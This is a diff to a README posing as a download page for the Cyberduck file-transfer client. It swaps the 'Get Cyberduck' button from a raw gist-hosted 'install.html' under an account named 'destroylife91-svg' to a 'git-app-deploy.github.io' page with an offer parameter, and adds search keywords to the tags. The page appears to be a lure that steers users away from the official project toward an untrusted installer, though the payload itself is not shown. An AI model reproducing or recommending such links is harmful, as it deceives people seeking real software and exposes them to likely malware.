@@ -1,6 +1,6 @@
 # Cyberduck Download — Desktop Transfer Utility
 
-[![Get Cyberduck GitHub](https://img.shields.io/badge/Get%20Cyberduck%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/destroylife91-svg/5a5c2d02085ac4491df773d29cd25159/raw/b2780a77047432e14b834cc718982a2ea0c0d2f5/install.html?offer=Cyberduck)
+[![Get Cyberduck GitHub](https://img.shields.io/badge/Get%20Cyberduck%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Cyberduck)
 
 ---
 
@@ -78,7 +78,7 @@ A: Popular providers like S3, Backblaze, Google Cloud, and others are supported.
 
 ## 🔍 Tags
 
-Cyberduck, FTP client desktop, SFTP transfer, WebDAV access, cloud storage manager, secure file exchange, remote file handling, Cyberduck pc, Cyberduck windows, Cyberduck desktop, Cyberduck for mac, Cyberduck for pc, Cyberduck for windows, Cyberduck mac
+Cyberduck, cyber duck mac, duck ftp, cyberduck ftp, cyberduck download, FTP client desktop, SFTP transfer, WebDAV access, cloud storage manager, secure file exchange, remote file handling, Cyberduck pc, Cyberduck windows, Cyberduck desktop, Cyberduck for mac, Cyberduck for pc, Cyberduck for windows, Cyberduck mac
 
 ---
 
